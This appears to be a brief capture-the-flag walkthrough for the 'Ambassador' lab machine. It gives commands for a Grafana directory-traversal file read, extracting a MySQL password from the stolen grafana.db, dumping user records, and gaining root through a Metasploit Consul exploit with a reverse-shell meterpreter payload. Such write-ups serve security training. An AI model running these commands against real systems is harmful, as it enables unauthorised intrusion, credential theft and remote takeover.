Save the ip on /etc/hosts

The first thing was to search for an exploit for grafana and there was a "directory traversal file read"

# https://www.exploit-db.com/exploits/50581

With further reading on the next link i found the common directories and with that i download a db file
# https://github.com/grafana/grafana/blob/main/conf/defaults.ini

# curl --path-as-is http://ambassador.htb:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db

Analyzing the db file i found a mysql passwd

# sqlite3 grafana.db
# .tables
# select * from data_source;

With this the next thing to do is to access the db

# mysql -h ambassador.htb -u grafana -p
# show databases;
# use whackywidget;
# show tables;
# select * from users;

And that's how you get the user :)


**ROOT PRIV ESCALATION**

In the opt directory there are two files named consul & my-app and the second has some logs

# git show	// The red letters shows a token that we'll use latter

The other file name is 'consul' and doing some research i found that has a msf exploit
# https://blog.pentesteracademy.com/hashicorp-consul-remote-command-execution-via-services-api-d709f8ac3960

With this we have the enough info to get root shell

# ssh -L 8500:0.0.0.0:8500 developer@ambassador.htb
# msfconsole"use multi/misc/consul_service_exec; set payload linux/x86/meterpreter/reverse_tcp;set rhosts 127.0.0.1; set lhost [Your_IP]; set acl_token [the token]; set lport 9090; exploit"
And that's how you get root shell :D
